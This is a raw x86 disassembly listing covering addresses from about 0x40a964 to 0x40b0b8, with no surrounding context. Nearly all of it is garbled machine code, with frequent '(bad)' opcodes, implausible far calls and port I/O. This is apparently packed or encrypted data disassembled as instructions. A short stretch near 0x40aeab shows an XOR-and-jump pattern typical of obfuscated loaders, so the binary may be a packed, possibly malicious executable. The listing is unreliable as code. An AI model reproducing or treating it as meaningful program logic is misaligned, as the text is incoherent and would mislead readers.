  40a964:	jnp    0x40a93f
  40a966:	daa    
  40a967:	xchg   BYTE PTR [eax],bl
  40a969:	push   0xffffffdc
  40a96b:	fmul   DWORD PTR [edx+0x19]
  40a96e:	dec    edi
  40a96f:	les    ecx,FWORD PTR [edx]
  40a971:	mov    edi,0x1af8f875
  40a976:	jb     0x40a9b4
  40a978:	mov    ds:0x928b5c8e,eax
  40a97d:	test   eax,0x544b0820
  40a982:	inc    eax
  40a983:	push   ss
  40a984:	jno    0x40aa04
  40a986:	adc    al,0xc5
  40a988:	xchg   esp,eax
  40a989:	sbb    BYTE PTR [edx],dl
  40a98b:	and    DWORD PTR [eax+0x19da6ef1],0x975ea6a4
  40a995:	clc    
  40a996:	(bad)  
  40a997:	addr16 and dl,cl
  40a99a:	mov    esi,0x47a526e6
  40a99f:	jle    0x40aa19
  40a9a1:	les    ecx,FWORD PTR [ebp+0x71f65331]
  40a9a7:	ret    
  40a9a8:	mov    edx,0xaca89b24
  40a9ad:	dec    edi
  40a9ae:	stos   DWORD PTR es:[edi],eax
  40a9af:	xchg   edi,eax
  40a9b0:	test   BYTE PTR [edi+0x78c2d18a],ch
  40a9b6:	ins    DWORD PTR es:[edi],dx
  40a9b7:	sar    DWORD PTR [edx+eiz*8],cl
  40a9ba:	mov    edx,0x8d191ff6
  40a9bf:	mov    dl,0x5f
  40a9c1:	out    dx,al
  40a9c2:	ror    DWORD PTR [ebx+eiz*1+0x78],0x71
  40a9c7:	ret    
  40a9c8:	inc    eax
  40a9c9:	xchg   DWORD PTR [ebx*8-0x48458de6],ebp
  40a9d0:	leave  
  40a9d1:	call   0xfa64:0xa2e57409
  40a9d8:	mov    ch,0xbd
  40a9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9db:	mov    ds:0xed17a402,eax
  40a9e0:	daa    
  40a9e1:	int3   
  40a9e2:	xchg   BYTE PTR ds:0x1f1bd9bb,dh
  40a9e8:	xchg   ebp,eax
  40a9e9:	(bad)  
  40a9ea:	adc    edx,DWORD PTR [ebx+0x41]
  40a9ed:	mov    eax,ds:0x6606580a
  40a9f2:	ror    DWORD PTR [ebp+0x6d],cl
  40a9f5:	add    DWORD PTR [esi+0x4757f2be],ebp
  40a9fb:	pop    ds
  40a9fc:	add    dh,BYTE PTR [esp+edi*4-0x5e]
  40aa00:	pop    eax
  40aa01:	xchg   ebx,eax
  40aa02:	xchg   edx,eax
  40aa03:	push   esi
  40aa04:	sbb    eax,0xe8abfc04
  40aa09:	in     eax,dx
  40aa0a:	jg     0x40a9d8
  40aa0c:	dec    esp
  40aa0d:	add    ch,BYTE PTR [edx]
  40aa0f:	jg     0x40a9c6
  40aa11:	lods   eax,DWORD PTR ds:[esi]
  40aa12:	mov    ds:0x59008316,al
  40aa17:	xchg   esp,eax
  40aa18:	mov    edx,0x444d2292
  40aa1d:	out    dx,eax
  40aa1e:	push   esp
  40aa1f:	xor    al,0xf0
  40aa21:	data16 shr BYTE PTR ds:0x6d4da8e9,1
  40aa28:	fisttp QWORD PTR [ecx-0x7b]
  40aa2b:	xchg   ebx,eax
  40aa2c:	sub    DWORD PTR [ecx+0x8],edx
  40aa2f:	mov    bh,0x42
  40aa31:	cdq    
  40aa32:	fs jb  0x40a9d0
  40aa35:	xchg   esi,eax
  40aa36:	push   edx
  40aa37:	je     0x40a9f6
  40aa39:	cld    
  40aa3a:	xchg   esp,eax
  40aa3b:	cs js  0x40aa71
  40aa3e:	sub    bh,BYTE PTR [ebx-0x1e]
  40aa41:	push   cs
  40aa42:	fs xchg ebx,eax
  40aa44:	clc    
  40aa45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa46:	push   0x9b4a28b6
  40aa4b:	mov    ch,0x5b
  40aa4d:	push   eax
  40aa4e:	inc    eax
  40aa4f:	dec    ecx
  40aa50:	dec    eax
  40aa51:	and    ebp,esp
  40aa53:	test   DWORD PTR [esi],esp
  40aa55:	test   al,0x52
  40aa57:	mov    ds:0xdaf71e40,eax
  40aa5c:	xchg   DWORD PTR [ebp-0x1c3f8f6c],esp
  40aa62:	and    al,0x92
  40aa64:	cmp    bh,bl
  40aa66:	clc    
  40aa67:	mov    edx,0x92b2ec9d
  40aa6c:	mov    cl,0x4c
  40aa6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa6f:	jbe    0x40aa45
  40aa71:	xor    eax,0x6eef5923
  40aa76:	inc    esp
  40aa77:	sub    BYTE PTR [eax+0x2a],al
  40aa7a:	outs   dx,BYTE PTR ds:[esi]
  40aa7b:	popf   
  40aa7c:	jmp    0x67451
  40aa81:	push   edx
  40aa82:	push   es
  40aa83:	pop    ebp
  40aa84:	mov    edi,0x36ad7d73
  40aa89:	mov    dl,dh
  40aa8b:	in     al,dx
  40aa8c:	popf   
  40aa8d:	pop    edx
  40aa8e:	push   ds
  40aa8f:	(bad)  
  40aa90:	dec    eax
  40aa91:	xlat   BYTE PTR ds:[ebx]
  40aa92:	push   ebx
  40aa93:	pop    ebp
  40aa94:	imul   ebp,eax,0x90f938b4
  40aa9a:	inc    ebx
  40aa9b:	out    0x39,al
  40aa9d:	daa    
  40aa9e:	mov    dh,0x68
  40aaa0:	and    al,0x75
  40aaa2:	dec    BYTE PTR [ebx+eax*1]
  40aaa5:	(bad)  
  40aaa6:	jmp    0x40aac4
  40aaa8:	in     eax,dx
  40aaa9:	jb     0x40aa3d
  40aaab:	or     al,0x1f
  40aaad:	xchg   esi,eax
  40aaae:	fldcw  WORD PTR [ebp-0x3611a53e]
  40aab4:	mov    cl,0xa0
  40aab6:	rol    DWORD PTR [esi+0x19],1
  40aab9:	ret    
  40aaba:	ins    BYTE PTR es:[edi],dx
  40aabb:	(bad)  
  40aabc:	sub    DWORD PTR [edi+0x72],esp
  40aabf:	stos   DWORD PTR es:[edi],eax
  40aac0:	xor    ebx,DWORD PTR [edi+eiz*1]
  40aac3:	loop   0x40ab1c
  40aac5:	jbe    0xbb098286
  40aacb:	scas   eax,DWORD PTR es:[edi]
  40aacc:	pop    ds
  40aacd:	sbb    dh,BYTE PTR [esi]
  40aacf:	(bad)  
  40aad0:	inc    eax
  40aad1:	xchg   edx,eax
  40aad2:	jecxz  0x40aafc
  40aad4:	loopne 0x40aa5e
  40aad6:	ret    
  40aad7:	pop    edi
  40aad8:	jbe    0x40aa88
  40aada:	and    dl,cl
  40aadc:	and    BYTE PTR [edx+0x45],cl
  40aadf:	adc    ch,BYTE PTR [edx]
  40aae1:	sti    
  40aae2:	mov    ds:0x2e5880ef,al
  40aae7:	jnp    0x40aa85
  40aae9:	ins    DWORD PTR es:[edi],dx
  40aaea:	mov    ds:0xdd2accbe,eax
  40aaef:	adc    dl,cl
  40aaf1:	add    eax,0xe93f6186
  40aaf6:	push   0x95569d06
  40aafb:	aam    0x36
  40aafd:	mov    DWORD PTR [esi],ecx
  40aaff:	fwait
  40ab00:	hlt    
  40ab01:	and    edi,ecx
  40ab03:	test   DWORD PTR [ebp-0x51b1f7b9],edi
  40ab09:	pop    edx
  40ab0a:	hlt    
  40ab0b:	xor    al,0xf
  40ab0d:	stos   DWORD PTR es:[edi],eax
  40ab0e:	and    DWORD PTR [esi],edi
  40ab10:	mov    ds:0x93194034,eax
  40ab15:	sub    al,0x9d
  40ab17:	pop    edi
  40ab18:	test   eax,0x5bbe58bc
  40ab1d:	xchg   esi,eax
  40ab1e:	mov    ch,0x15
  40ab20:	into   
  40ab21:	pop    ebp
  40ab22:	pusha  
  40ab23:	pop    DWORD PTR [ecx+0x68b033e9]
  40ab29:	dec    esp
  40ab2a:	pop    eax
  40ab2b:	repz add esp,eax
  40ab2e:	sahf   
  40ab2f:	pop    ecx
  40ab30:	ret    
  40ab31:	dec    esp
  40ab32:	hlt    
  40ab33:	sub    eax,0xd5a3a0c
  40ab38:	adc    ah,0xc3
  40ab3b:	and    cl,bh
  40ab3d:	fs pop edi
  40ab3f:	es in  eax,dx
  40ab41:	dec    edx
  40ab42:	popa   
  40ab43:	pop    ebx
  40ab44:	pop    es
  40ab45:	ins    DWORD PTR es:[edi],dx
  40ab46:	mov    edi,0xc0edccd2
  40ab4b:	jb     0x40ab18
  40ab4d:	ja     0x40ab09
  40ab4f:	repnz gs repz hlt 
  40ab53:	(bad)  
  40ab54:	test   eax,0xe5486fc0
  40ab59:	clc    
  40ab5a:	pop    ds
  40ab5b:	pop    ss
  40ab5c:	add    DWORD PTR [ebx-0x7923af7d],esp
  40ab62:	cdq    
  40ab63:	imul   esi,DWORD PTR [ebp+0x72935f37],0x30
  40ab6a:	loope  0x40abcd
  40ab6c:	into   
  40ab6d:	(bad)  
  40ab6e:	jbe    0x40ab9d
  40ab70:	sbb    al,0x92
  40ab72:	push   es
  40ab73:	loope  0x40ab51
  40ab75:	push   ss
  40ab76:	pop    ebp
  40ab77:	stos   BYTE PTR es:[edi],al
  40ab78:	fisub  DWORD PTR [ecx]
  40ab7a:	sub    al,0x6d
  40ab7c:	outs   dx,BYTE PTR ds:[esi]
  40ab7d:	into   
  40ab7e:	sbb    BYTE PTR [edi+eax*4-0x103a6c9f],bh
  40ab85:	xchg   edi,eax
  40ab86:	fcmovne st,st(1)
  40ab88:	mov    esp,0xd5b7e046
  40ab8d:	dec    edi
  40ab8e:	dec    ebx
  40ab8f:	pop    ebx
  40ab90:	cmp    DWORD PTR [ebx-0x5e],0x3fca7dd4
  40ab97:	add    al,0x6
  40ab99:	pop    edi
  40ab9a:	outs   dx,BYTE PTR ds:[esi]
  40ab9b:	add    al,0xbc
  40ab9d:	jl     0x40aba0
  40ab9f:	cwde   
  40aba0:	ss ins BYTE PTR es:[edi],dx
  40aba2:	(bad)  
  40aba3:	stc    
  40aba4:	(bad)  
  40aba5:	out    0xec,al
  40aba7:	cmovp  edx,DWORD PTR [ebp+0x35]
  40abab:	jp     0x40ab5e
  40abad:	push   edi
  40abae:	cmp    al,0x33
  40abb0:	cli    
  40abb1:	pop    edx
  40abb2:	es mov ah,0xc9
  40abb5:	xchg   DWORD PTR [esi+0x10],edx
  40abb8:	ss in  al,0x13
  40abbb:	popf   
  40abbc:	je     0x40ab90
  40abbe:	jg     0x40ab44
  40abc0:	cmp    eax,0x3b3eef51
  40abc5:	dec    ecx
  40abc6:	adc    al,0x97
  40abc8:	test   BYTE PTR [edi],al
  40abca:	sbb    BYTE PTR [ebp-0x31af466e],dl
  40abd0:	ficomp DWORD PTR [ebx-0x72a343c5]
  40abd6:	lods   al,BYTE PTR ds:[esi]
  40abd7:	push   0xffffffb4
  40abd9:	pop    ebx
  40abda:	cwde   
  40abdb:	pop    ss
  40abdc:	call   0xb732:0x7cab3447
  40abe3:	mov    eax,ds:0x1690fe73
  40abe8:	out    0x15,eax
  40abea:	adc    dl,BYTE PTR [ecx-0x4acd1d20]
  40abf0:	ret    0x4da8
  40abf3:	fdivr  QWORD PTR [esi]
  40abf5:	dec    ebx
  40abf6:	das    
  40abf7:	fbld   TBYTE PTR [esi-0x24]
  40abfa:	mov    BYTE PTR [ebx],al
  40abfc:	stc    
  40abfd:	adc    ebx,DWORD PTR [edi+0x112e6103]
  40ac03:	inc    ebp
  40ac04:	cmp    ecx,ecx
  40ac06:	jo     0x40abd5
  40ac08:	push   ebp
  40ac09:	cmp    eax,0xff03779b
  40ac0e:	sar    BYTE PTR [edx+edx*4-0x3d83a9b2],1
  40ac15:	leave  
  40ac16:	(bad)  
  40ac17:	sti    
  40ac18:	cli    
  40ac19:	mov    dh,0xec
  40ac1b:	fisttp QWORD PTR [ebx+0x42]
  40ac1e:	loop   0x40ac94
  40ac20:	inc    eax
  40ac21:	mov    ch,0x11
  40ac23:	enter  0xc9b2,0x60
  40ac27:	adc    cl,bl
  40ac29:	cdq    
  40ac2a:	in     al,0x94
  40ac2c:	xchg   edi,eax
  40ac2d:	fwait
  40ac2e:	enter  0x8f72,0xa7
  40ac32:	clc    
  40ac33:	push   eax
  40ac34:	bound  esi,QWORD PTR [edi+0x60863b87]
  40ac3a:	sub    al,al
  40ac3c:	mov    esp,0xfb61904
  40ac41:	bound  ecx,QWORD PTR [ebp+edx*1-0x6f438e02]
  40ac48:	out    0x4e,eax
  40ac4a:	or     DWORD PTR [esi-0x2e],edi
  40ac4d:	pop    es
  40ac4e:	jge    0x40ac1c
  40ac50:	or     al,0x2a
  40ac52:	cmp    eax,DWORD PTR [esi]
  40ac54:	ss ins BYTE PTR es:[edi],dx
  40ac56:	inc    ebp
  40ac57:	sbb    eax,0x89768eef
  40ac5c:	xor    DWORD PTR [esi+0x18],ebx
  40ac5f:	aas    
  40ac60:	push   ds
  40ac61:	int3   
  40ac62:	test   DWORD PTR [ecx],edi
  40ac64:	jp     0x40ac79
  40ac66:	or     al,0xfe
  40ac68:	pop    ss
  40ac69:	mov    esp,0x234c8ade
  40ac6e:	icebp  
  40ac6f:	mov    ?,WORD PTR [edi+0x27]
  40ac72:	xchg   edi,eax
  40ac73:	or     cl,BYTE PTR [ecx-0x45d97699]
  40ac79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac7a:	fsub   st(1),st
  40ac7c:	or     DWORD PTR [ecx-0xd],edx
  40ac7f:	jne    0x40acb6
  40ac81:	add    bh,BYTE PTR ds:0x5dba8169
  40ac87:	mov    al,0x6b
  40ac89:	lods   al,BYTE PTR ds:[esi]
  40ac8a:	imul   esi,edi,0xffffff87
  40ac8d:	cs (bad) 
  40ac8f:	popa   
  40ac90:	shl    DWORD PTR [eax],1
  40ac92:	ds mov edx,0x53cea4f
  40ac98:	push   ecx
  40ac99:	xor    al,0xf3
  40ac9b:	and    cl,BYTE PTR [edi-0x42]
  40ac9e:	jno    0x40ac95
  40aca0:	ds pop eax
  40aca2:	popf   
  40aca3:	jb     0x40acbc
  40aca5:	inc    ecx
  40aca6:	ret    0x4a43
  40aca9:	xor    BYTE PTR [esp+esi*8+0x20],0x25
  40acae:	add    eax,0x90f8d655
  40acb3:	mov    eax,ds:0x5f0ea242
  40acb8:	test   BYTE PTR [ebp-0x56],ah
  40acbb:	ds or  edx,esi
  40acbe:	in     al,dx
  40acbf:	mov    edx,DWORD PTR [ecx-0x6f]
  40acc2:	fwait
  40acc3:	lods   al,BYTE PTR ds:[esi]
  40acc4:	xchg   ebx,eax
  40acc5:	push   cs
  40acc6:	xor    eax,0xafb9fd92
  40accb:	xchg   DWORD PTR [esi+0x6ca0fca6],esi
  40acd1:	out    0x84,eax
  40acd3:	push   ebp
  40acd4:	lds    ecx,FWORD PTR [ecx+0x7cc5e898]
  40acda:	push   ds
  40acdb:	cmc    
  40acdc:	mov    esi,0x98fc0138
  40ace1:	cmp    eax,0xcf27adc4
  40ace7:	fistp  QWORD PTR [ecx]
  40ace9:	fwait
  40acea:	dec    edx
  40aceb:	in     eax,dx
  40acec:	xor    edi,0x96b2060a
  40acf2:	adc    eax,0xada3f78
  40acf7:	outs   dx,BYTE PTR ds:[esi]
  40acf8:	daa    
  40acf9:	dec    esp
  40acfa:	jns    0x40ac81
  40acfc:	sbb    DWORD PTR [edx],edi
  40acfe:	inc    DWORD PTR [esi+edi*4+0x2a01ea5a]
  40ad05:	test   eax,0x71b13371
  40ad0a:	cdq    
  40ad0b:	retf   0xd90f
  40ad0e:	pop    ss
  40ad0f:	loop   0x40ad2e
  40ad11:	test   BYTE PTR [edx+ebp*4],bh
  40ad14:	in     eax,dx
  40ad15:	test   al,0x31
  40ad17:	or     esi,esi
  40ad19:	sar    DWORD PTR [ecx+0x38],0xcb
  40ad1d:	jge    0x40ad0a
  40ad1f:	cmp    eax,0x6aae5ab1
  40ad24:	aad    0x69
  40ad26:	mov    ds:0x1c6f02d8,eax
  40ad2b:	sar    DWORD PTR [ecx-0x47],0xb6
  40ad2f:	xchg   esp,eax
  40ad30:	add    DWORD PTR ds:0x527e3b24,eax
  40ad36:	and    ecx,DWORD PTR [edi+0x58c7de2f]
  40ad3c:	inc    edx
  40ad3d:	inc    esp
  40ad3e:	repz cmp ch,BYTE PTR ds:0xb81280d8
  40ad45:	xor    BYTE PTR [ebx-0x78],cl
  40ad48:	jmp    0xcb247378
  40ad4d:	shl    DWORD PTR fs:[ebx+0x67],1
  40ad51:	xchg   BYTE PTR [edx-0x15],cl
  40ad54:	push   ds
  40ad55:	ins    BYTE PTR es:[edi],dx
  40ad56:	fs push ss
  40ad58:	sahf   
  40ad59:	cmp    al,0xb
  40ad5b:	lahf   
  40ad5c:	mov    DWORD PTR [edx],ebx
  40ad5e:	js     0x40add9
  40ad60:	pop    eax
  40ad61:	jmp    0x819a:0xc628f096
  40ad68:	sar    DWORD PTR [ecx+esi*1-0x17c200f9],1
  40ad6f:	stos   BYTE PTR es:[edi],al
  40ad70:	stos   DWORD PTR es:[edi],eax
  40ad71:	mov    al,ds:0x3a1d8ac3
  40ad76:	sbb    eax,0x2716e5b8
  40ad7b:	daa    
  40ad7c:	xor    BYTE PTR [ecx-0x7ca194f8],ch
  40ad82:	jns    0x40ad50
  40ad84:	mov    WORD PTR [ebx-0x39f53121],ds
  40ad8a:	nop
  40ad8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad8c:	inc    eax
  40ad8d:	add    ebp,DWORD PTR [edx-0x8]
  40ad90:	sbb    eax,0xa07351bd
  40ad95:	or     eax,0x96c13740
  40ad9a:	(bad)  
  40ad9b:	jmp    0x2af75d90
  40ada0:	add    eax,0x58167192
  40ada5:	jb     0x40adf2
  40ada7:	outs   dx,BYTE PTR ds:[esi]
  40ada8:	jns    0x40ad3b
  40adaa:	mov    esp,0x1a22a36b
  40adaf:	pop    ss
  40adb0:	push   ss
  40adb1:	fst    QWORD PTR [ebp+0x18]
  40adb4:	fcmovu st,st(6)
  40adb6:	(bad)  
  40adb7:	mov    esp,0xb0ae3fa2
  40adbc:	jo     0x40ae28
  40adbe:	xor    BYTE PTR [ebp-0x33],ah
  40adc1:	mov    ch,BYTE PTR [edi+edi*4+0x241c1b7a]
  40adc8:	loope  0x40ae14
  40adca:	mov    eax,0xa0a45460
  40adcf:	pop    edi
  40add0:	call   0xdf11:0x60173a6a
  40add7:	and    dh,BYTE PTR [esi-0x14]
  40adda:	aad    0x45
  40addc:	xor    DWORD PTR [edi+0x75],esp
  40addf:	aaa    
  40ade0:	mov    ebx,0x22c1369a
  40ade5:	sbb    eax,0x3b69ddaf
  40adea:	outs   dx,BYTE PTR ds:[esi]
  40adeb:	aam    0x1c
  40aded:	adc    DWORD PTR [ebx+esi*8],esp
  40adf0:	adc    dh,al
  40adf2:	ret    0x52fe
  40adf5:	inc    esp
  40adf6:	loopne 0x40adc8
  40adf8:	lea    esp,[esi+0x0]
  40adfb:	pop    edi
  40adfc:	xchg   ebp,eax
  40adfd:	rcr    bh,cl
  40adff:	add    bl,BYTE PTR [ecx]
  40ae01:	cld    
  40ae02:	sbb    DWORD PTR [ebx+0x330dff2b],edi
  40ae08:	xor    DWORD PTR [eax+ebx*8],edx
  40ae0b:	or     BYTE PTR [ebx-0x34],0xf8
  40ae0f:	mov    esp,0x596cd283
  40ae14:	(bad)  
  40ae16:	mov    edi,0xd5ef6efa
  40ae1b:	jmp    0x40ae84
  40ae1d:	xchg   ecx,eax
  40ae1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae1f:	ror    DWORD PTR ds:0x31bc972a,cl
  40ae25:	in     al,0xaa
  40ae27:	xchg   ebx,eax
  40ae28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae29:	fisttp DWORD PTR [edx+0x1]
  40ae2c:	mov    bl,0xb2
  40ae2e:	into   
  40ae2f:	imul   eax,eax,0xffffff8b
  40ae32:	inc    esi
  40ae33:	jge    0x40ae71
  40ae35:	pop    ss
  40ae36:	nop
  40ae37:	jmp    edx
  40ae39:	pusha  
  40ae3a:	mov    al,0x64
  40ae3c:	outs   dx,DWORD PTR ds:[esi]
  40ae3d:	mov    al,0x45
  40ae3f:	fsubr  QWORD PTR [esi]
  40ae41:	ror    BYTE PTR ds:[ebx],1
  40ae44:	or     al,0xc4
  40ae46:	imul   esp,DWORD PTR [eax-0x13],0x863c6b1
  40ae4d:	pop    esi
  40ae4e:	jmp    0xf23:0xc3fc7108
  40ae55:	sub    al,ah
  40ae57:	sbb    bl,al
  40ae59:	dec    ebx
  40ae5a:	dec    edx
  40ae5b:	call   0x7f4d:0xf8409edc
  40ae62:	xchg   edx,eax
  40ae63:	lods   al,BYTE PTR ds:[esi]
  40ae64:	sub    al,0x1f
  40ae66:	sbb    edi,DWORD PTR [ebp+0x35]
  40ae69:	test   eax,0x624f65c1
  40ae6e:	(bad)  
  40ae6f:	ins    DWORD PTR es:[edi],dx
  40ae70:	jge    0x40aea3
  40ae72:	popf   
  40ae73:	enter  0x8bca,0xff
  40ae77:	and    al,0x42
  40ae79:	out    dx,eax
  40ae7a:	mov    ds:0xcb96ca04,eax
  40ae7f:	out    dx,eax
  40ae80:	loop   0x40ae7f
  40ae82:	sti    
  40ae83:	or     cl,bl
  40ae85:	pushf  
  40ae86:	jle    0x40ae5b
  40ae88:	xor    cl,dh
  40ae8a:	shr    DWORD PTR [ebp-0x44],cl
  40ae8d:	retf   
  40ae8e:	call   0x6f9:0x380d7c3a
  40ae95:	mov    ch,0x5d
  40ae97:	cli    
  40ae98:	inc    ecx
  40ae99:	xor    ecx,ecx
  40ae9b:	hlt    
  40ae9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae9d:	adc    DWORD PTR [ebp-0x3979893e],edx
  40aea3:	push   eax
  40aea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea5:	(bad)  
  40aea6:	lahf   
  40aea7:	enter  0xf1e4,0xaa
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx-0x701e58d0],al
  40aef6:	arpl   WORD PTR [eax],bx
  40aef8:	or     BYTE PTR [ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	and    BYTE PTR [ebx-0x5add39da],dh
  40af06:	fcmovnbe st,st(7)
  40af08:	pushf  
  40af09:	pop    ecx
  40af0a:	xor    ecx,DWORD PTR [edx-0x63]
  40af0d:	push   ebx
  40af0e:	(bad)  
  40af0f:	sub    bh,0x46
  40af12:	enter  0xa842,0xa3
  40af16:	pop    edi
  40af17:	mov    bh,0x19
  40af19:	and    DWORD PTR [ecx-0x79],esi
  40af1c:	out    0x53,al
  40af1e:	inc    eax
  40af1f:	xor    ecx,esi
  40af21:	aad    0xa
  40af23:	jle    0x40af6e
  40af25:	mov    WORD PTR [eax+edx*8+0x10e001b8],cs
  40af2c:	jne    0x40af05
  40af2e:	pop    edx
  40af2f:	jns    0x4eb06341
  40af35:	and    dh,dl
  40af37:	cmp    al,0x4c
  40af39:	push   0xffffff8a
  40af3b:	mov    ds:0x46a2ecbb,al
  40af40:	and    eax,0x5c09da6a
  40af45:	xor    eax,0xc814a7a8
  40af4a:	push   esi
  40af4b:	pop    edx
  40af4c:	jne    0x40afc4
  40af4e:	add    DWORD PTR [edx-0x57],ebx
  40af51:	hlt    
  40af52:	test   BYTE PTR ds:0xb13ee50a,dl
  40af58:	sub    BYTE PTR [esi+edi*1],ah
  40af5b:	dec    ebp
  40af5c:	and    eax,0xba3bac56
  40af61:	mov    ch,0xf9
  40af63:	je     0x40afe1
  40af65:	scas   al,BYTE PTR es:[edi]
  40af66:	pusha  
  40af67:	cs ds cmp eax,0x73378fd3
  40af6e:	mov    bl,0x94
  40af70:	adc    eax,0xdd208cb5
  40af75:	sbb    dl,dl
  40af77:	jg     0x40af5e
  40af79:	fisub  DWORD PTR [ebp+0x1bc01525]
  40af7f:	mov    ebp,0x93b2c231
  40af84:	sbb    eax,0x7e3bc134
  40af89:	enter  0xbfb0,0x10
  40af8d:	and    dh,BYTE PTR [esi-0x71]
  40af90:	jle    0x40b007
  40af92:	data16 lahf 
  40af94:	cdq    
  40af95:	mov    al,ds:0xf1f7fb6a
  40af9a:	test   DWORD PTR [eax-0x71],esi
  40af9d:	mov    ebp,0xaa0b7e42
  40afa2:	push   ebx
  40afa3:	stc    
  40afa4:	push   ecx
  40afa5:	outs   dx,BYTE PTR ds:[esi]
  40afa6:	pop    edi
  40afa7:	mov    ah,0x32
  40afa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afaa:	mov    WORD PTR [ebx],ss
  40afac:	xor    cl,BYTE PTR [esi]
  40afae:	ret    0x120c
  40afb1:	xchg   bx,ax
  40afb3:	xchg   ecx,eax
  40afb4:	push   cs
  40afb5:	data16 icebp 
  40afb7:	or     ecx,DWORD PTR [edx-0x3ddfdbcc]
  40afbd:	pusha  
  40afbe:	sahf   
  40afbf:	inc    esi
  40afc0:	aad    0xe6
  40afc2:	jb     0x40aff3
  40afc4:	and    esp,DWORD PTR [eax+eax*8+0xbd356ce]
  40afcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afcc:	neg    BYTE PTR [edx+0x797a5d4b]
  40afd2:	lahf   
  40afd3:	shl    ch,1
  40afd5:	adc    bl,BYTE PTR [esi+0x3a517053]
  40afdb:	jle    0x40afb4
  40afdd:	or     DWORD PTR [ebp+0x39],ebx
  40afe0:	push   eax
  40afe1:	mov    esi,DWORD PTR [eax-0x35]
  40afe4:	stos   BYTE PTR es:[edi],al
  40afe5:	pushf  
  40afe6:	cmc    
  40afe7:	pop    ecx
  40afe8:	adc    DWORD PTR [eax-0x3c],edi
  40afeb:	retf   
  40afec:	stc    
  40afed:	scas   al,BYTE PTR es:[edi]
  40afee:	repnz sbb BYTE PTR [ebx+0x6fa672b7],0x56
  40aff6:	outs   dx,DWORD PTR ds:[esi]
  40aff7:	mov    BYTE PTR [ecx+edi*2-0x655cb709],dl
  40affe:	(bad)  
  40afff:	mov    al,ds:0x484bdfc4
  40b004:	adc    al,0xac
  40b006:	and    BYTE PTR es:[edx],bh
  40b009:	in     al,dx
  40b00a:	mov    DWORD PTR [esi-0x2c],ebp
  40b00d:	dec    esp
  40b00e:	xchg   BYTE PTR [eax],dl
  40b010:	and    DWORD PTR [eax],esi
  40b012:	cwde   
  40b013:	out    0x4e,al
  40b015:	and    DWORD PTR [edi+0x7f],0x36
  40b019:	hlt    
  40b01a:	adc    eax,ebp
  40b01c:	sub    edx,DWORD PTR es:[edi+0xe4b6044]
  40b023:	scas   eax,DWORD PTR es:[edi]
  40b024:	(bad)  
  40b025:	push   ebx
  40b026:	and    al,0xa4
  40b028:	dec    edx
  40b029:	cmp    al,ch
  40b02b:	loop   0x40b0a1
  40b02d:	xlat   BYTE PTR ds:[ebx]
  40b02e:	or     BYTE PTR [eax-0x8a318d6],ch
  40b034:	shl    DWORD PTR [ebx-0x3030bfe],1
  40b03a:	movd   mm7,DWORD PTR [edx]
  40b03d:	aam    0xb
  40b03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b040:	push   esi
  40b041:	(bad)  
  40b043:	enter  0xc355,0x30
  40b047:	outs   dx,DWORD PTR ds:[esi]
  40b048:	lods   al,BYTE PTR ds:[esi]
  40b049:	mov    esp,0xf173e4b9
  40b04e:	imul   edi,DWORD PTR [edi+ebp*8+0x2f9ea120],0xffffff9e
  40b056:	dec    edi
  40b057:	lahf   
  40b058:	cs push ebp
  40b05a:	loopne 0x40b071
  40b05c:	cmp    dh,BYTE PTR [esi*2+0x3fcd1e8b]
  40b063:	jo     0x40b014
  40b065:	mov    ecx,0xfd8f2f68
  40b06a:	es call 0xd771848b
  40b070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b071:	or     al,0x2d
  40b073:	push   esp
  40b074:	inc    ecx
  40b075:	push   0xcb47a20e
  40b07a:	and    DWORD PTR [ebp-0x28],0x20c23a95
  40b081:	xchg   ebp,eax
  40b082:	sbb    DWORD PTR [ecx+0x1f],esp
  40b085:	aas    
  40b086:	mov    ds:0xf223c57b,al
  40b08b:	fwait
  40b08c:	cmp    eax,0xe4445858
  40b091:	repz loop 0x40b051
  40b094:	fadd   DWORD PTR [ecx+0x74dd7e30]
  40b09a:	mov    BYTE PTR [edi-0x2c],ch
  40b09d:	inc    eax
  40b09e:	aam    0xcb
  40b0a0:	mov    ds,WORD PTR [edx]
  40b0a2:	iret   
  40b0a3:	stos   DWORD PTR es:[edi],eax
  40b0a4:	xchg   edi,eax
  40b0a5:	pop    ds
  40b0a6:	ret    
  40b0a7:	xor    bl,BYTE PTR [edx-0x4259b154]
  40b0ad:	adc    DWORD PTR ss:[ebp-0x59],edx
  40b0b1:	imul   ebx,DWORD PTR [eax-0x71],0x40b6bbe0
  40b0b8:	dec    edx
